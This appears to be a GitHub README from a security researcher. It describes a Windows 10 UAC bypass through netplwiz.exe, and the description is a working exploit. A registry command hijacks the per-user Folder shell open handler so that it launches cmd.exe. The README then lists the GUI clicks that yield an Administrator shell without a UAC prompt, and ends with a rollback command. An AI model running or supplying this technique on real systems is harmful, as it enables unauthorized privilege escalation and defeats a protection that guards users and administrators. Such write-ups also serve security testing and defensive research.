# GUI_UAC_bypassX
gui uac bypass (netplwiz.exe)

- Type: GUI Hack   <br>
- Method: Registry key manipulation <br> 
- Target: \system32\netplwiz.exe <br>
- Component(s): Attacker defined <br>
- Works from: window 10 <br><br>


`HKCU\Software\Classes\Folder\shell\open\command` was called when click manage passwords button in netplwiz.exe
![test](https://github.com/sailay1996/GUI_UAC_bypassX/blob/master/img/2019-09-02_161622.jpg)
`x`
#### Produce steps: <br>
* Run command <br> `reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c cmd.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f`
  <br> 
* run <b>netplwiz.exe</b> in cmd .
  <br> 
* Select the "<b>Advanced</b>" tab, and  click the "<b>Manage Passwords</b>" button.
* then you will get <b> Administrator Shell</b>.  <br>
![test](https://github.com/sailay1996/GUI_UAC_bypassX/blob/master/img/2019-09-02_163333.jpg)
#### Rollback command : 
`reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f`
 <br> <br>
 [@404death](https://twitter.com/404death)
